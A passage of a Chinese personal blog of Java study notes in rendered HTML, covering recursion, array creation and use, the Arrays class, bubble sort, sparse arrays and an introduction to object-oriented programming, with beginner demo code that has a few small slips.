class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> n*f(n-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230824115453376.png" alt="image-20230824115453376"></p><p>边界条件：边界</p><p>前阶段：</p><p>返回阶段：n*（n-1）</p><p><strong>尽量少用递归，压栈的时候电脑容易崩溃</strong></p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组是相同类型数据的有序集合.<br>数组描述的是相同类型的若干个数据,按照一定的先后次序排列组合而成。<br>其中,每一个数据称作一个数组元素,每个数组元素可以通过一个下标来访问它们.</p><h4 id="数组的声明和创建"><a href="#数组的声明和创建" class="headerlink" title="数组的声明和创建"></a>数组的声明和创建</h4><p>首先必须声明数组变量，才能在程序中使用数组。下面是声明数组变量的语法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dataType[]arrayRefVar;//首选的方法</span><br><span class="line">或</span><br><span class="line">回</span><br><span class="line">dataType arrayRefVar[];1/效果梅同，但不是首选方法</span><br></pre></td></tr></table></figure><p>Java语言使用new操作符来创建数组，语法如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dataType[] arrayRefVar = new dataType[ arraySize];</span><br></pre></td></tr></table></figure><p>数组的元素是通过索引访问的，数组索引从О开始。<br>获取数组长度:<br>arrays. length</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="comment">//变量得类型  变量的名字=变量的值</span></span><br><span class="line">    <span class="comment">//数组类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] nums;<span class="comment">//1.声明一个数组</span></span><br><span class="line">        nums=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];<span class="comment">//2.创建一个数组这里面可以存放10个int类型的数据</span></span><br><span class="line">        <span class="comment">//3.给数组中的元素赋值</span></span><br><span class="line">        nums[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        nums[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">        nums[<span class="number">2</span>]=<span class="number">751</span>;</span><br><span class="line">        nums[<span class="number">3</span>]=<span class="number">16</span>;</span><br><span class="line">        nums[<span class="number">4</span>]=<span class="number">51</span>;</span><br><span class="line">        nums[<span class="number">5</span>]=<span class="number">15</span>;</span><br><span class="line">        nums[<span class="number">6</span>]=<span class="number">14</span>;</span><br><span class="line">        nums[<span class="number">7</span>]=<span class="number">21</span>;</span><br><span class="line">        nums[<span class="number">8</span>]=<span class="number">123</span>;</span><br><span class="line">        nums[<span class="number">9</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//计算所有元素的和</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;nums.length; i++) &#123;</span><br><span class="line">            sum=sum+nums[i];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组的四个基本特点<br>其长度是确定的。数组一旦被创建，它的大小就是不可以改变的。其元素必须是相同类型,不允许出现混合类型。<br>数组中的元素可以是任何数据类型，包括基本类型和引用类型。<br>数组变量属引用类型，数组也可以看成是对象，数组中的每个元素相当于该对象的成员变量。数组本身就是对象，Java中对象是在堆中的，因此数组无论保存原始类型还是其他对象类型,数组对象本身是在堆中的。</p><h4 id="java内存分析"><a href="#java内存分析" class="headerlink" title="java内存分析"></a>java内存分析</h4><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230824163338365.png" alt="image-20230824163338365"></p><blockquote><p>三种初始化</p><p>静态初始化<br>int[] a &#x3D; {1,2,3];<br>Man[ ] mans &#x3D; {new Man(1,1) ,new Man(2,2)};<br>动态初始化<br>int[] a &#x3D; new int[2];a[0]&#x3D;1;<br>a[1]&#x3D;2;<br>数组的默认初始化<br>数组是引用类型，它的元素相当于类的实例变量，因此数组一经分配空间，其中的每个元素也被按照实例变量同样的方式被隐式初始化。</p></blockquote><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230824172553805.png" alt="image-20230824172553805"></p><p>数组是相同数据类型(数据类型可以为任意类型)的有序集合数组也是对象。数组元素相当于对象的成员变量<br>数组长度的确定的，不可变的。如果越界，则报:ArraylndexOutofBounds</p><h4 id="数组的使用"><a href="#数组的使用" class="headerlink" title="数组的使用"></a>数组的使用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArraryDemo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> []arrays=&#123;<span class="number">14</span>,<span class="number">22</span>,<span class="number">3342</span>,<span class="number">4</span>,<span class="number">545</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印出来全部的数组数据</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arrays.length;i++)&#123;</span><br><span class="line">            System.out.println(arrays[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line">        <span class="comment">//计算所有元素的和</span></span><br><span class="line">        <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arrays.length;i++)&#123;</span><br><span class="line">            sum=sum+arrays[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;sum=&quot;</span>+sum);</span><br><span class="line">        <span class="comment">//查找最大元素</span></span><br><span class="line">        System.out.println(<span class="string">&quot;    查找最大元素   &quot;</span>);</span><br><span class="line">        <span class="type">int</span> max=arrays[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arrays.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arrays[i]&gt;max)&#123;</span><br><span class="line">                max=arrays[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;max=&quot;</span>+max);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arrays = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>&#125;;</span><br><span class="line">        <span class="comment">//JDK1,5  没有下标</span></span><br><span class="line"><span class="comment">//        for (int array : arrays) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(array);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        printArrary(arrays);</span><br><span class="line">        <span class="type">int</span>[] reverse=reverse(arrays);</span><br><span class="line">        printArrary(reverse);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打印数组元素</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printArrary</span><span class="params">(<span class="type">int</span>[] arrays)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arrays.length; i++) &#123;</span><br><span class="line">            System.out.print(arrays[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反转数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] reverse(<span class="type">int</span>[] arrays) &#123;</span><br><span class="line">        <span class="type">int</span>[] result=<span class="keyword">new</span> <span class="title class_">int</span>[arrays.length];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反转的操作</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,j=result.length-<span class="number">1</span>;i&lt;arrays.length;i++,j--)&#123;</span><br><span class="line">            result[j]=arrays[i];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h4><p>多维数组可以看成是数组的数组，比如一个二维数组</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230825155338196.png" alt="image-20230825155338196"></p><p>####Arrays类<br>数组的工具类java.util.Arrays<br>由于数组对象本身并没有什么方法可以供我们调用,但API中提供了一个工具类Arrays供我们使用,从而可以对数据对象进行一些基本的操作。<br>查看JDK帮助文档<br>Arrays类中的方法都是static修饰的静态方法,在使用的时候可以直接使用类名进行调用,而”不用”使用对象来调用(注意:是”不用”而不是”不能”)<br>具有以下常用功能:<br>给数组赋值:通过fil方法。<br>对数组排序:通过sort方法,按升序。<br>比较数组:通过equals方法比较数组中元素值是否相等。<br>◆查找数组元素:通过binarySearch方法能对排序好的数组进行二分查找法操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo06</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] a=&#123;<span class="number">7</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">612</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        System.out.println(a);<span class="comment">//[I@1b6d3586</span></span><br><span class="line">        <span class="comment">//打印数组元素</span></span><br><span class="line">        Arrays.sort(a);<span class="comment">//排序</span></span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line">        printArray(a);</span><br><span class="line">        Arrays.fill(a,<span class="number">2</span>,<span class="number">5</span>,<span class="number">0</span>);</span><br><span class="line">        System.out.println(Arrays.toString(a));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printArray</span><span class="params">(<span class="type">int</span>[] a)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;[&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i==a.length-<span class="number">1</span>)&#123;</span><br><span class="line">                System.out.print(a[i]+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.print(a[i]+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo07</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] b=&#123;<span class="number">7</span>,<span class="number">3</span>,<span class="number">65</span>,<span class="number">2</span>,<span class="number">65</span>,<span class="number">34</span>,<span class="number">74</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] sort=sort(b);</span><br><span class="line">        System.out.println(Arrays.toString(sort));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//冒泡排序</span></span><br><span class="line">    <span class="comment">//1.比较数组中，两个相邻的元素，如果第一个数比第二个数组大，我们就交换它们的位置</span></span><br><span class="line">    <span class="comment">//2.没出一次比较，都会产生一个最大，或者最小的数字</span></span><br><span class="line">    <span class="comment">//3.下一轮可以少一次排序</span></span><br><span class="line">    <span class="comment">//4.以此循环直到结束</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> [] sort(<span class="type">int</span>[] array)&#123;</span><br><span class="line">        <span class="comment">//外层循环，判断走多少次</span></span><br><span class="line">        <span class="type">int</span> t=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;array.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span><span class="literal">false</span>;<span class="comment">//通过flag标识为减少没有意义的比较</span></span><br><span class="line">            <span class="comment">//内存循环，比较判断两个数，如果第一个数，比第二个数打，则交换</span></span><br><span class="line">             <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;array.length-<span class="number">1</span>-i;j++)&#123;</span><br><span class="line">                 <span class="keyword">if</span> (array[j+<span class="number">1</span>]&lt;array[j])&#123;</span><br><span class="line">                     t=array[j];</span><br><span class="line">                     array[j]=array[j+<span class="number">1</span>];</span><br><span class="line">                     array[j+<span class="number">1</span>]=t;</span><br><span class="line">                     flag=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span>(flag==<span class="literal">false</span>)&#123;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="稀疏数组"><a href="#稀疏数组" class="headerlink" title="稀疏数组"></a>稀疏数组</h4><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230825174855519.png"></p><p>当一个数组中大部分元素为0，或者为同一值的数组时，可以使用稀疏数组来保存该数组。稀疏数组的处理方式是:<br>记录数组一共有几行几列，有多少个不同值<br>把具有不同值的元素和行列及值记录在一个小规模的数组中，从而缩小程序的规模如下图:左边是原始数组，右边是稀疏数组</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230825175125458.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo08</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建一个二维数组11*11   0：没有</span></span><br><span class="line">        <span class="type">int</span>[][] array1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">11</span>][<span class="number">11</span>];</span><br><span class="line">        array1[<span class="number">2</span>][<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">        array1[<span class="number">3</span>][<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;输出原始的数组&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] ints : array1) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> anInt : ints) &#123;</span><br><span class="line">                System.out.print(anInt + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//转换为稀疏数组</span></span><br><span class="line">        <span class="comment">//获取有效值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">11</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">11</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (array1[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                    sum++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;&#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;有效值的个数：&quot;</span> + sum);</span><br><span class="line">            <span class="comment">//2.创建一个稀疏数组的数组</span></span><br><span class="line">            <span class="type">int</span>[][] array2 = <span class="keyword">new</span> <span class="title class_">int</span>[sum + <span class="number">1</span>][<span class="number">3</span>];</span><br><span class="line">            array2[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">11</span>;</span><br><span class="line">            array2[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">11</span>;</span><br><span class="line">            array2[<span class="number">0</span>][<span class="number">2</span>] = sum;</span><br><span class="line">            <span class="comment">//遍历二维数组，将非零值，存放在稀疏数组中</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; array1.length; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; array1[i].length; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (array1[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                        count++;</span><br><span class="line">                        array2[count][<span class="number">0</span>] = i;</span><br><span class="line">                        array2[count][<span class="number">1</span>] = j;</span><br><span class="line">                        array2[count][<span class="number">2</span>] = array1[i][j];</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//输出数组</span></span><br><span class="line">            System.out.println(<span class="string">&quot;稀疏数组&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; array2.length; i++) &#123;</span><br><span class="line">                System.out.println(array2[i][<span class="number">0</span>] + <span class="string">&quot;\t&quot;</span></span><br><span class="line">                        + array2[i][<span class="number">1</span>] + <span class="string">&quot;\t&quot;</span></span><br><span class="line">                        + array2[i][<span class="number">2</span>] + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;---------&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;还原&quot;</span>);</span><br><span class="line">            <span class="comment">//1.读取稀疏数组</span></span><br><span class="line">            <span class="type">int</span>[][] array3 = <span class="keyword">new</span> <span class="title class_">int</span>[array2[<span class="number">0</span>][<span class="number">0</span>]][array2[<span class="number">0</span>][<span class="number">1</span>]];</span><br><span class="line">            <span class="comment">//2.给其中的元素还原他的值</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; array2.length; i++) &#123;</span><br><span class="line">                array3[array2[i][<span class="number">0</span>]][array2[i][<span class="number">1</span>]] = array2[i][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//3.打印</span></span><br><span class="line">            System.out.println(<span class="string">&quot;输出还原数组&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span>[] ints : array1) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> anInt : ints) &#123;</span><br><span class="line">                    System.out.print(anInt + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><p>java的核心思想是oop</p><p>面向过程思想：步骤简单清晰，第一步干什么，第二步干什么。。。</p><p>面对过程适合吃力一些较为简单的问题</p><p>面向对象思想：物以类聚，分类的的思维模式，思考问题首先为一解决文艺需要哪些分类，然后对这些分类进行单独思考，最后才对某个分类下的细节进行面向过程的思索</p><p>对于描述复杂的失误，为了从宏观上把握，从整体上合理分析，我们需要使用面向对象的思路来分析整个系统。但是具体到围观操作，仍然需要面向过程的思路去处理。</p><p>面向对象编程（object-Oriented Programming,OOP)</p><p>面向过程编程的本质就是：以类的方式组织代码，以对象的组织（封装）数据。</p><p>抽象</p><p>三大特性：封装   继承  多态</p><p>从认识论的角度考虑的是现有对象后有类。对象，是具体的事物。类是抽象的，是对对象的抽象</p><p>从代码运行角度考虑是先有类后有对象。类是对象的模板</p><h3 id="回顾方法的调用"><a href="#回顾方法的调用" class="headerlink" title="回顾方法的调用"></a>回顾方法的调用</h3><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230826144121984.png"></p><p>####静态方法与非静态方法的一些不同</p><p>静态方法是和类一起加载的，有类就有静态方法，而非静态方法是类实例后才存在的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static void a()&#123;</span><br><span class="line"> b()</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">public  static void b()&#123;</span><br><span class="line">a()</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>都是静态方法的情况下可以互相引用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 